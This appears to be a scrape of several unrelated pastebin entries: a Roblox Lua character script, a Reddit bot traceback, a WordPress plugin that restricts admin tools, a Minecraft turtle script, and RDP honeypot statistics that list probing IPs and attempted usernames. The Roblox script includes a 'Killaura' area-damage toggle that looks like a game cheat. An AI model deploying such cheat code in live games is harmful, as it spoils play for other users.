						CFrame.new(0.5-((-lm*math.sin((sin+1.35)/wsv))*-lft),-2+th*math.cos(sin/(wsv/2))-lh*math.cos((sin+1.35)/wsv)+(math.rad(-walkangle*(-lft+afnt))),-((-lm*math.sin((sin+1.35)/wsv))*fnt)+math.rad((torsoturn*lft))) * CFrame.Angles(-math.rad((((walkang*math.sin((sin)/wsv))*fnt)+(-baseang*afnt))+(-walkangle*fnt)),-math.rad(((legturn)*(fnt*lft))-(torsoturn*lft)),-math.rad((((walkang*math.sin((sin)/wsv))*lft))+(-walkangle*lft))),
						CFrame.new(0,1.5,0) * CFrame.Angles(math.rad(((-5*math.cos((sin+0.3)/(wsv/2)))*fnt)+(-walkangle*fnt)),-math.rad((10*lft)),-math.rad((-5*math.cos((sin+0.3)/(wsv/2)))*lft)),
						CFrame.new(-0.478249133, 1.24518871, -0.0847764164, 0.487069905, -0.228174642, -0.843029141, 0.0255902112, 0.968581319, -0.247371614, 0.872986257, 0.0989149883, 0.477606773)*CFrame.Angles(math.rad(2*math.cos(sin/50)),math.rad(2*math.cos(sin/45)),math.rad(2*math.cos(sin/57)))
					},(.1*self.WalkSpeed/16) / self.FpsValue)
				end
				if math.cos(sin/wsv)/2>.2 and Step==""L"" then
					Step=""R""
					local hit, pos = self:Raycast(leftleg.self.Position, leftleg.self.Position - Vector3.new(0, 2, 0), 2, self.Ignore)
					if(hit)then
						self:SoundEffect(leftleg.self, 7140152455, .5, .6, true)
						local x,y,z = leftleg.self.CFrame:ToEulerAnglesXYZ()
						self:Effect(CFrame.new(pos)*CFrame.Angles(0,y,0), 0, Vector3.new(1,0.1,1), Color3.new(0,0,1), 4, {
							Transparency = 1,
							Color = Color3.new()
						},{
							Scale = Vector3.new(0,0,0)
						})
					end
				end
				if math.cos(sin/wsv)/2<-.2 and Step==""R"" then
					Step=""L""
					local hit, pos = self:Raycast(rightleg.self.Position, rightleg.self.Position - Vector3.new(0, 2, 0), 2, self.Ignore)
					if(hit)then
						self:SoundEffect(rightleg.self, 7140152455, .5, .6, true)
						local x,y,z = rightleg.self.CFrame:ToEulerAnglesXYZ()
						self:Effect(CFrame.new(pos)*CFrame.Angles(0,y,0), 0, Vector3.new(1,0.1,1), Color3.new(0,0,1), 4, {
							Transparency = 1,
							Color = Color3.new()
						},{
							Scale = Vector3.new(0,0,0)
						})
					end
				end
			else
				if(not self.AxeEnabled)then
					self.Animate({
						CFrame.new(((0.3*math.cos((sin+2.45)/25))*lft),0.5*math.cos((sin-0.5)/28),((0.3*math.cos((sin+2.45)/25))*fnt)) * CFrame.Angles(math.rad(((30+15*math.cos(sin/30))*fnt)),math.rad(0),math.rad(((30+5*math.cos((sin+1.34)/28))*lft)))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.5,0+.1*math.cos(sin/56),0.1*fnt) * CFrame.Angles(-math.rad((20*fnt)+5*math.cos(sin/30)),math.rad(0),math.rad((20*lft)-10)),
						CFrame.new(-0.5,-2+0.1-0.2*math.cos((sin+3)/26),0.1+0.2*math.cos((sin-0.73)/29)) * CFrame.Angles(math.rad(-20-10*math.cos((sin+2.7)/24)),math.rad(0),math.rad(5*lft)),
						CFrame.new(1.5,0-.1*math.cos(sin/55),0.1*fnt) * CFrame.Angles(-math.rad((20*fnt)+5*math.cos(sin/30)),math.rad(0),math.rad((20*lft)+10)),
						CFrame.new(0.5,-2+0.3-0.3*math.cos((sin+1.32)/29),-0.5+0.2*math.cos((sin-1)/25)) * CFrame.Angles(math.rad(-10-10*math.cos((sin+2.34)/26.5)),math.rad(0),math.rad(5*lft)),
						CFrame.new(0,1.5,0) * CFrame.Angles(math.rad(13+5*math.cos((sin+3.145)/29)),math.rad(0),math.rad(0))
					},.1 / self.FpsValue)
				else
					self.Animate({
						CFrame.new(((0.3*math.cos((sin+2.45)/25))*lft),0.5*math.cos((sin-0.5)/28),((0.3*math.cos((sin+2.45)/25))*fnt)) * CFrame.Angles(math.rad(((30+15*math.cos(sin/30))*fnt)),math.rad(0),math.rad(((30+5*math.cos((sin+1.34)/28))*lft)))*CFrame.Angles(0,math.rad(-180),0),
						CFrame.new(-1.5,0+.1*math.cos(sin/56),0.1*fnt) * CFrame.Angles(-math.rad((20*fnt)+5*math.cos(sin/30)),math.rad(0),math.rad((20*lft)-10)),
						CFrame.new(-0.5,-2+0.1-0.2*math.cos((sin+3)/26),0.1+0.2*math.cos((sin-0.73)/29)) * CFrame.Angles(math.rad(-20-10*math.cos((sin+2.7)/24)),math.rad(0),math.rad(5*lft)),
						CFrame.new(1.59755099, 0.0619570613, -0.632522881, 0.955168366, -0.145516485, -0.257833987, -0.121584572, 0.601251662, -0.789755404, 0.269945472, 0.785697997, 0.556604028)*CFrame.new(0,-.1*math.cos(sin/30),0)*CFrame.Angles(math.rad(-5*math.cos(sin/35)),math.rad(-5*math.cos(sin/37)),math.rad(-5*math.cos(sin/43))),
						CFrame.new(0.5,-2+0.3-0.3*math.cos((sin+1.32)/29),-0.5+0.2*math.cos((sin-1)/25)) * CFrame.Angles(math.rad(-10-10*math.cos((sin+2.34)/26.5)),math.rad(0),math.rad(5*lft)),
						CFrame.new(0,1.5,0) * CFrame.Angles(math.rad(13+5*math.cos((sin+3.145)/29)),math.rad(0),math.rad(0)),
						CFrame.new(-0.478249133, 1.24518871, -0.0847764164, 0.487069905, -0.228174642, -0.843029141, 0.0255902112, 0.968581319, -0.247371614, 0.872986257, 0.0989149883, 0.477606773)*CFrame.Angles(math.rad(2*math.cos(sin/50)),math.rad(2*math.cos(sin/45)),math.rad(2*math.cos(sin/57)))
					},.1 / self.FpsValue)
				end
			end
		end
		if((self.Falling or self.Jumping) and not self.Attacking)then
			self.Animate({
				CFrame.new(0,0,0)*CFrame.Angles(math.rad(0),math.rad(0 -180),math.rad(0)),
				CFrame.new(-1.5,2,0)*CFrame.Angles(math.rad(180),math.rad(0),math.rad(0)),
				CFrame.new(-0.5,-2,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
				CFrame.new(1.5,2,0)*CFrame.Angles(math.rad(180),math.rad(0),math.rad(0)),
				CFrame.new(0.5,-2,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0)),
				CFrame.new(0,1.5,0)*CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
			},.1 / self.FpsValue)
		end
		if(self.Flying)then
			if(a >= a2)then
				a = 0
				local pos, hit = self:Raycast(self.CurrentPosition.Position, self.CurrentPosition.Position-Vector3.new(0,3.1,0), 20, self.Ignore)
				if(hit)then
					local cf = self.CurrentPosition * CFrame.new(0, hit.Y - self.CurrentPosition.Y + 3, 0) * CFrame.new(math.random(-10,10),0,math.random(-10,10))
					self:Effect(cf, 0, Vector3.new(math.random(),math.random(),math.random()), Color3.new(0,0,math.random()), 2, {
						Transparency = 1,
						Color = Color3.new(),
						Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
						Position = (cf * CFrame.new(math.random(-10,10),15,math.random(-10,10))).Position
					}, {
						Scale = Vector3.new(0,0,0)
					})
				end
			end
		end
		torso.ModifyProperty(""CFrame"", self.FakeCurrentPosition * self.Torso)
		head.ModifyProperty(""CFrame"", self.FakeCurrentPosition * self.Torso * self.Head)
		leftarm.ModifyProperty(""CFrame"", self.FakeCurrentPosition * self.Torso * self.LeftArm)
		rightarm.ModifyProperty(""CFrame"", self.FakeCurrentPosition * self.Torso * self.RightArm)
		leftleg.ModifyProperty(""CFrame"", self.FakeCurrentPosition * self.Torso * self.LeftLeg)
		rightleg.ModifyProperty(""CFrame"", self.FakeCurrentPosition * self.Torso * self.RightLeg)
		campart.ModifyProperty(""CFrame"", self.FakeCurrentPosition * CFrame.new(0, 1.5, 0))
		axe.ModifyProperty(""CFrame"", self.FakeCurrentPosition * self.Torso * self.RightArm * self.Axe)
		if(self.Killaura and e >= e2)then
			e = 0
			self:Effect(torso.self.Position+Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10)), 0, Vector3.new(math.random(),math.random(),math.random()), Color3.new(0,0,math.random()), 1, {
				Transparency = 1,
				Position = torso.self.Position,
				Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
				Color = Color3.new()
			},{
				Scale = Vector3.new()
			})
			self:Aoe(torso.self.Position, 10)
		end
		if(not self.Flying)then
			local pos, hit = self:Raycast(self.CurrentPosition.Position, self.CurrentPosition.Position-Vector3.new(0,3.1,0), 3.1, self.Ignore)
			if pos then
				if(a >= a2)and(self.Killaura)then
					a = 0
					local cf = self.CurrentPosition * CFrame.new(0, hit.Y - self.CurrentPosition.Y + 3, 0) * CFrame.new(math.random(-10,10),0,math.random(-10,10))
					self:Effect(cf, 0, Vector3.new(math.random(),math.random(),math.random()), Color3.new(0,0,math.random()), 2, {
						Transparency = 1,
						Color = Color3.new(),
						Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360)),
						Position = (cf * CFrame.new(math.random(-10,10),15,math.random(-10,10))).Position
					}, {
						Scale = Vector3.new(0,0,0)
					})
				end
				self.Velocity = Vector3.new(self.Velocity.X, 0, self.Velocity.Z)
				self.Falling = false
				self.CurrentPosition = self.CurrentPosition * CFrame.new(0, hit.Y - self.CurrentPosition.Y + 3, 0)
			else
				if c >= c2 then
					c = 0
					self.Velocity = Vector3.new(self.Velocity.X, self.Velocity.Y - 0.06, self.Velocity.Z)
				end
				self.Falling = true
			end
			if self.Velocity.Y > .01 then
				self.Jumping = true
			elseif self.Velocity.Y < .01 then
				self.Jumping = false
			end
		end
		self.LastPosition = self.CurrentPosition
		self.FakeLastPosition = self.FakeCurrentPosition
	end))

	local function OnChat(m)
		local msg = """"
		if m:sub(1,3) == ""/e "" then
			msg = m:sub(4)
		else
			msg = m:sub(1)
		end
		if string.lower(msg) == ""->stop"" or string.lower(msg) == ""-&gt;stop"" then
			self:End()
		end
		chatfunc(msg)
	end

	table.insert(self.Connections, self:GetCurrentPlayer().Chatted:Connect(OnChat))

	table.insert(self.Connections, game:GetService(""Players"").PlayerAdded:Connect(function(plr)
		if(plr.Name == self.Player)then
			table.insert(self.Connections, self:GetCurrentPlayer().Chatted:Connect(OnChat))
		end
	end))
end

function sc:End()
	self.Remote:FireAllClients(""End"",{})
	self.RefitCore.KillOperation()
	for i, v in next, self.Connections do
		pcall(function()
			v:Disconnect()
		end)
	end
	table.clear(sc)
end

sc:Init()"
LD4H69hp,RequestException: error with request,basedcount_bot,Python,Thursday 20th of June 2024 09:30:09 PM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 263, in read_comments
    async for comment in pcm_subreddit.stream.comments(skip_existing=True):  # Comment
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/util.py"", line 160, in stream_generator
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/util.py"", line 160, in <listcomp>
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 34, in __anext__
    await self._next_batch()
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 785, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 567, in _objectify_request
    await self.request(
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1032, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 286, in _request_with_retries
    response, saved_exception = await self._make_request(
                                ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 192, in _make_request
    response = await self._rate_limiter.call(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/rate_limit.py"", line 51, in call
    response = await request_function(*args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/requestor.py"", line 80, in request
    raise RequestException(exc, args, kwargs) from None
asyncprawcore.exceptions.RequestException: error with request 
"
R6dBHFZU,temp,ofmarconi,PHP,Thursday 20th of June 2024 09:02:15 PM CDT,"<?php
/**
 * Plugin Name: WPSandbox Dynamic Plugin Deactivator for Non-SuperAdmin Users
 * Plugin URI: https://wpsandbox.net/1195
 * Description: This system plugin dynamically/temporarily deactivates some plugins for non-admin users. Important: Must be installed in the mu-plugins folder in order to start early.
 * Version: 1.0.0
 * Author: Svetoslav Marinov (Slavi)
 * Author URI: http://WPSandbox.net
 * Text Domain: wpsandbox
 */

$plugin_deactivator_obj = new WPSandbox_Dynamic_Plugin_Deactivator();
add_action('muplugins_loaded', [ $plugin_deactivator_obj, 'installHooks' ] );

/**
 * WPSandbox Dynamic Plugin Deactivator
 */
class WPSandbox_Dynamic_Plugin_Deactivator {
    // List of SuperAdmin users that are allowed to access all plugins
    private $super_admin_users_arr = [
        'networkadmin',
        // add a username here
    ];

    private $allowed_plugins_for_admins_users_only = [
        'sql-buddy/sql-buddy.php',
        'wp-file-manager/file_folder_manager.php',
        'advanced-database-cleaner-pro/advanced-db-cleaner.php',
        'code-snippets/code-snippets.php',
        'plugin-check/plugin.php',
        'wp-ses/wp-ses.php',
    ];

    public function installHooks() {
        if (is_multisite()) {
            add_filter('site_option_active_sitewide_plugins', [ $this, 'maybeDeactivatePlugin' ] );
        } else {
            add_filter('option_active_plugins', [ $this, 'maybeDeactivatePlugin' ] );
        }
    }

    /**
     * This method does the actual work to determine which plugins to deactivate.
     * @param array $plugins_arr
     * @return array
     */
    public function maybeDeactivatePlugin($plugins_arr) {
        static $mem_data = [];

        if (!function_exists('wp_get_current_user')) {
            return $plugins_arr;
        }

        $user_obj = wp_get_current_user();

        if (empty($user_obj->user_login)) { // can't find username for some reason
            return $plugins_arr;
        }

        try {
            $cur_username = $user_obj->user_login;

            $plugins_copy = $plugins_arr;
            ksort($plugins_copy); // ensure consistency by sorting by keys JIC

            $hash_inp = [ 'u' => $cur_username, 'p' => $plugins_copy, ];
            $hash = sha1(serialize($hash_inp));

            // this function is called multiple times, so we cache the result in memory because we like speed.
            if (isset($mem_data[$hash])) {
                return $mem_data[$hash];
            }

            // If current user is in the list, return plugins as is
            // Superadmins are allowed to access all plugins
            if (empty($this->super_admin_users_arr)) { // no users defined so checking for super admin
                if (is_super_admin()) {
                    return $plugins_arr;
                }
            } else if (in_array($cur_username, $this->super_admin_users_arr)) {
                return $plugins_arr;
            }

            // Plugins to be allowed for admin users only (from array above)
            $allowed_plugins_for_admins_users_only = $this->allowed_plugins_for_admins_users_only;

            if (empty($allowed_plugins_for_admins_users_only)) {
                return $plugins_arr;
            }

            // Unset plugins if conditions are met
            foreach ($allowed_plugins_for_admins_users_only as $plugin) {
                if (isset($plugins_arr[$plugin])) {
                    unset($plugins_arr[$plugin]);
                }
            }
        } finally {
            $mem_data[$hash] = $plugins_arr;
        }

        return $plugins_arr;
    }
}
"
W2rS0xE3,ConcreteMaker,TechManDylan,Lua,Thursday 20th of June 2024 09:00:23 PM CDT,"-- List of all concrete powder and concrete block names
local concretePowderNames = {
    ""minecraft:white_concrete_powder"",
    ""minecraft:orange_concrete_powder"",
    ""minecraft:magenta_concrete_powder"",
    ""minecraft:light_blue_concrete_powder"",
    ""minecraft:yellow_concrete_powder"",
    ""minecraft:lime_concrete_powder"",
    ""minecraft:pink_concrete_powder"",
    ""minecraft:gray_concrete_powder"",
    ""minecraft:light_gray_concrete_powder"",
    ""minecraft:cyan_concrete_powder"",
    ""minecraft:purple_concrete_powder"",
    ""minecraft:blue_concrete_powder"",
    ""minecraft:brown_concrete_powder"",
    ""minecraft:green_concrete_powder"",
    ""minecraft:red_concrete_powder"",
    ""minecraft:black_concrete_powder""
}

local concreteNames = {
    ""minecraft:white_concrete"",
    ""minecraft:orange_concrete"",
    ""minecraft:magenta_concrete"",
    ""minecraft:light_blue_concrete"",
    ""minecraft:yellow_concrete"",
    ""minecraft:lime_concrete"",
    ""minecraft:pink_concrete"",
    ""minecraft:gray_concrete"",
    ""minecraft:light_gray_concrete"",
    ""minecraft:cyan_concrete"",
    ""minecraft:purple_concrete"",
    ""minecraft:blue_concrete"",
    ""minecraft:brown_concrete"",
    ""minecraft:green_concrete"",
    ""minecraft:red_concrete"",
    ""minecraft:black_concrete""
}

-- Function to find a slot with any concrete powder
function findConcretePowderSlot()
    for slot = 1, 16 do
        local item = turtle.getItemDetail(slot)
        if item then
            for _, powderName in ipairs(concretePowderNames) do
                if item.name == powderName then
                    return slot
                end
            end
        end
    end
    return nil
end

-- Function to place concrete powder and break resulting concrete block
function placeAndBreakConcrete()
    while true do
        local concretePowderSlot = findConcretePowderSlot()
        if not concretePowderSlot then
            print(""No concrete powder found. Waiting..."")
            sleep(5) -- Wait for 5 seconds before checking again
        else
            turtle.select(concretePowderSlot)
            if turtle.place() then
                sleep(0.5) -- Wait for the block to convert to concrete
                if turtle.detect() then
                    local success, data = turtle.inspect()
                    if success then
                        for _, concreteName in ipairs(concreteNames) do
                            if data.name == concreteName then
                                turtle.dig()
                                break
                            end
                        end
                    end
                end
            end
        end
    end
end

-- Start the loop
placeAndBreakConcrete()
"
WHzt1sB9,Untitled,nooblollolololol,Lua,Thursday 20th of June 2024 08:01:37 PM CDT,"if game.PlaceId == 6403373529 or game.PlaceId == 11520107397 then
    while task.wait(0.1) do
        for _, obj in ipairs(game:GetService(""Lighting""):GetChildren()) do
            if obj:IsA(""ColorCorrectionEffect"") then
                if string.find(obj.Name, ""FiftyKillstreakEffect"") and string.find(obj.Name, ""√Ö"") or string.find(obj.Name, ""Killstreakcolor"") then
                    obj:Destroy()
                end
            end
        end
    end
end"
LdWpCjwW,2024-06-20_stats.json,rdp_snitch,JSON,Thursday 20th of June 2024 07:18:30 PM CDT,"{
  ""ip"": {
    ""104.248.154.46"": 15,
    ""164.92.104.215"": 30,
    ""58.218.199.219"": 6,
    ""213.109.202.250"": 24,
    ""116.140.196.215"": 6,
    ""205.210.31.237"": 9,
    ""64.124.50.139"": 6,
    ""103.121.74.4"": 9,
    ""185.234.216.88"": 6,
    ""51.195.66.73"": 6,
    ""185.232.67.44"": 3,
    ""154.53.166.124"": 6,
    ""194.165.16.73"": 6,
    ""194.165.16.10"": 6,
    ""45.136.254.145"": 18,
    ""198.235.24.180"": 9,
    ""60.255.174.158"": 3,
    ""80.66.66.250"": 33,
    ""139.9.189.14"": 6,
    ""124.71.139.40"": 6,
    ""194.165.16.37"": 6,
    ""159.223.52.93"": 3,
    ""45.153.166.80"": 45,
    ""223.166.31.100"": 3,
    ""128.14.237.130"": 3,
    ""139.59.123.230"": 759,
    ""205.210.31.42"": 9,
    ""81.19.135.2"": 9,
    ""185.170.144.3"": 3,
    ""79.124.60.218"": 12,
    ""45.227.254.49"": 6,
    ""45.227.254.55"": 6,
    ""198.235.24.230"": 9,
    ""104.152.52.201"": 3
  },
  ""asn"": {
    ""AS14061"": 807,
    ""AS4134"": 6,
    ""AS208312"": 24,
    ""AS4837"": 9,
    ""AS396982"": 36,
    ""AS6461"": 6,
    ""AS134886"": 9,
    ""AS57523"": 6,
    ""AS16276"": 6,
    ""AS209132"": 3,
    ""AS62425"": 6,
    ""AS48721"": 18,
    ""AS56309"": 18,
    ""AS51765"": 33,
    ""AS55990"": 12,
    ""AS19437"": 45,
    ""AS17621"": 3,
    ""AS135377"": 3,
    ""AS209588"": 9,
    ""AS197414"": 3,
    ""AS50360"": 12,
    ""AS267784"": 12,
    ""AS14987"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 48,
    ""Chinanet"": 6,
    ""Red Byte LLC"": 24,
    ""China Unicom CHINA169 Network"": 6,
    ""Google LLC"": 36,
    ""Zayo Bandwidth"": 6,
    ""Super Sonic Broadband Pvt. Ltd"": 9,
    ""Chang Way Technologies Co. Limited"": 6,
    ""OVH SAS"": 6,
    ""IPADMIN CONTACT: noc@my-hosting.net"": 3,
    ""Mailbox Internet Hizmetleri Ltd. Sti."": 6,
    ""Flyservers S.A."": 39,
    ""Siamdata Communication Co., ltd."": 18,
    ""China Unicom China169 Network"": 3,
    ""Oy Crea Nova Hosting Solution Ltd"": 33,
    ""Huawei Cloud Service data center"": 12,
    ""Secured Servers LLC"": 45,
    ""China Unicom Shanghai Province Network"": 3,
    ""Zenlayer Inc"": 3,
    ""DIGITALOCEAN"": 759,
    ""Xhost Internet Solutions LP"": 3,
    ""Tamatiya EOOD"": 12,
    ""Rethem Hosting LLC"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 807,
    ""Chinanet JS"": 6,
    ""Chang Way Technologies Co. Limited"": 30,
    ""China United Network Communications Corporation Limited"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Microsoft Corporation"": 6,
    ""Super Sonic Broadband Pvt Ltd"": 9,
    ""Ali Mehmet"": 6,
    ""Agent Global Network LTD"": 3,
    ""Kuzey Veri Merkezi Anonim Sirketi"": 6,
    ""Flyservers S.A"": 18,
    ""ReadyIDC Co., Ltd"": 18,
    ""SiChuan Cable TV Network CO., LTD"": 3,
    ""Xhost Internet Solutions"": 33,
    ""Huawei Public Cloud Service"": 6,
    ""Huawei Cloud Service"": 6,
    ""Net"": 45,
    ""Unknown"": 3,
    ""UCLOUD"": 3,
    ""Alviva Holding Limited"": 9,
    ""Xhostis"": 3,
    ""Tamatiya EOOD"": 12,
    ""UAB Host Baltic"": 12,
    ""Rethem Hosting LLC"": 3
  },
  ""regionName"": {
    ""Central Singapore"": 15,
    ""California"": 66,
    ""Jiangsu"": 6,
    ""Moscow"": 30,
    ""Beijing"": 6,
    ""Virginia"": 51,
    ""Maharashtra"": 9,
    ""Hesse"": 15,
    ""Timi\u0219 County"": 3,
    ""Istanbul"": 6,
    ""Kaunas"": 18,
    ""Nonthaburi"": 18,
    ""Sichuan"": 3,
    ""Uusimaa"": 33,
    ""Guangdong"": 6,
    ""Shanghai"": 9,
    ""South West"": 762,
    ""Taiwan"": 3,
    ""North Holland"": 3,
    ""Plovdiv"": 12,
    ""Vilnius"": 12,
    ""Illinois"": 3
  },
  ""country"": {
    ""Singapore"": 777,
    ""United States"": 120,
    ""China"": 30,
    ""Russia"": 30,
    ""India"": 9,
    ""Germany"": 15,
    ""Romania"": 3,
    ""T\u00fcrkiye"": 6,
    ""Lithuania"": 30,
    ""Thailand"": 18,
    ""Finland"": 33,
    ""Taiwan"": 3,
    ""The Netherlands"": 3,
    ""Bulgaria"": 12
  },
  ""account"": {
    ""hello"": 900,
    ""Test"": 57,
    ""(empty)"": 12,
    ""eMfVwdgXp"": 3,
    ""zfwfYo"": 3,
    ""KihqbH"": 3,
    ""Administr"": 45,
    ""YAiLJHvoR"": 3,
    ""OjnrFu"": 3,
    ""ntkBNa"": 3,
    ""Domain"": 21,
    ""Administrator"": 3,
    ""AsJUsRuPn"": 3,
    ""wCVuly"": 3,
    ""dNZAOz"": 3,
    ""c7sbakcm"": 12,
    ""VHNcyopSl"": 3,
    ""zZGJBZ"": 3,
    ""RzSTqQ"": 3,
    ""nmap"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1089
  },
  ""client_build"": {
    ""Unknown"": 1089
  },
  ""client_name"": {
    ""Unknown"": 1089
  },
  ""ip_type"": {
    ""hosting"": 930,
    ""Unknown"": 84,
    ""proxy"": 30,
    ""hosting & proxy"": 45
  }
}"
BLUFgJK2,2024-06-20_stats.json,rdp_snitch,JSON,Thursday 20th of June 2024 07:16:15 PM CDT,"{
  ""ip"": {
    ""104.248.154.46"": 10,
    ""164.92.104.215"": 20,
    ""58.218.199.219"": 4,
    ""213.109.202.250"": 16,
    ""116.140.196.215"": 4,
    ""205.210.31.237"": 6,
    ""64.124.50.139"": 4,
    ""103.121.74.4"": 6,
    ""185.234.216.88"": 4,
    ""51.195.66.73"": 4,
    ""185.232.67.44"": 2,
    ""154.53.166.124"": 4,
    ""194.165.16.73"": 4,
    ""194.165.16.10"": 4,
    ""45.136.254.145"": 12,
    ""198.235.24.180"": 6,
    ""60.255.174.158"": 2,
    ""80.66.66.250"": 22,
    ""139.9.189.14"": 4,
    ""124.71.139.40"": 4,
    ""194.165.16.37"": 4,
    ""159.223.52.93"": 2,
    ""45.153.166.80"": 30,
    ""223.166.31.100"": 2,
    ""128.14.237.130"": 2,
    ""139.59.123.230"": 506,
    ""205.210.31.42"": 6,
    ""81.19.135.2"": 6,
    ""185.170.144.3"": 2,
    ""79.124.60.218"": 8,
    ""45.227.254.49"": 4,
    ""45.227.254.55"": 4,
    ""198.235.24.230"": 6,
    ""104.152.52.201"": 2
  },
  ""asn"": {
    ""AS14061"": 538,
    ""AS4134"": 4,
    ""AS208312"": 16,
    ""AS4837"": 6,
    ""AS396982"": 24,
    ""AS6461"": 4,
    ""AS134886"": 6,
    ""AS57523"": 4,
    ""AS16276"": 4,
    ""AS209132"": 2,
    ""AS62425"": 4,
    ""AS48721"": 12,
    ""AS56309"": 12,
    ""AS51765"": 22,
    ""AS55990"": 8,
    ""AS19437"": 30,
    ""AS17621"": 2,
    ""AS135377"": 2,
    ""AS209588"": 6,
    ""AS197414"": 2,
    ""AS50360"": 8,
    ""AS267784"": 8,
    ""AS14987"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 32,
    ""Chinanet"": 4,
    ""Red Byte LLC"": 16,
    ""China Unicom CHINA169 Network"": 4,
    ""Google LLC"": 24,
    ""Zayo Bandwidth"": 4,
    ""Super Sonic Broadband Pvt. Ltd"": 6,
    ""Chang Way Technologies Co. Limited"": 4,
    ""OVH SAS"": 4,
    ""IPADMIN CONTACT: noc@my-hosting.net"": 2,
    ""Mailbox Internet Hizmetleri Ltd. Sti."": 4,
    ""Flyservers S.A."": 26,
    ""Siamdata Communication Co., ltd."": 12,
    ""China Unicom China169 Network"": 2,
    ""Oy Crea Nova Hosting Solution Ltd"": 22,
    ""Huawei Cloud Service data center"": 8,
    ""Secured Servers LLC"": 30,
    ""China Unicom Shanghai Province Network"": 2,
    ""Zenlayer Inc"": 2,
    ""DIGITALOCEAN"": 506,
    ""Xhost Internet Solutions LP"": 2,
    ""Tamatiya EOOD"": 8,
    ""Rethem Hosting LLC"": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 538,
    ""Chinanet JS"": 4,
    ""Chang Way Technologies Co. Limited"": 20,
    ""China United Network Communications Corporation Limited"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Microsoft Corporation"": 4,
    ""Super Sonic Broadband Pvt Ltd"": 6,
    ""Ali Mehmet"": 4,
    ""Agent Global Network LTD"": 2,
    ""Kuzey Veri Merkezi Anonim Sirketi"": 4,
    ""Flyservers S.A"": 12,
    ""ReadyIDC Co., Ltd"": 12,
    ""SiChuan Cable TV Network CO., LTD"": 2,
    ""Xhost Internet Solutions"": 22,
    ""Huawei Public Cloud Service"": 4,
    ""Huawei Cloud Service"": 4,
    ""Net"": 30,
    ""Unknown"": 2,
    ""UCLOUD"": 2,
    ""Alviva Holding Limited"": 6,
    ""Xhostis"": 2,
    ""Tamatiya EOOD"": 8,
    ""UAB Host Baltic"": 8,
    ""Rethem Hosting LLC"": 2
  },
  ""regionName"": {
    ""Central Singapore"": 10,
    ""California"": 44,
    ""Jiangsu"": 4,
    ""Moscow"": 20,
    ""Beijing"": 4,
    ""Virginia"": 34,
    ""Maharashtra"": 6,
    ""Hesse"": 10,
    ""Timi\u0219 County"": 2,
    ""Istanbul"": 4,
    ""Kaunas"": 12,
    ""Nonthaburi"": 12,
    ""Sichuan"": 2,
    ""Uusimaa"": 22,
    ""Guangdong"": 4,
    ""Shanghai"": 6,
    ""South West"": 508,
    ""Taiwan"": 2,
    ""North Holland"": 2,
    ""Plovdiv"": 8,
    ""Vilnius"": 8,
    ""Illinois"": 2
  },
  ""country"": {
    ""Singapore"": 518,
    ""United States"": 80,
    ""China"": 20,
    ""Russia"": 20,
    ""India"": 6,
    ""Germany"": 10,
    ""Romania"": 2,
    ""T\u00fcrkiye"": 4,
    ""Lithuania"": 20,
    ""Thailand"": 12,
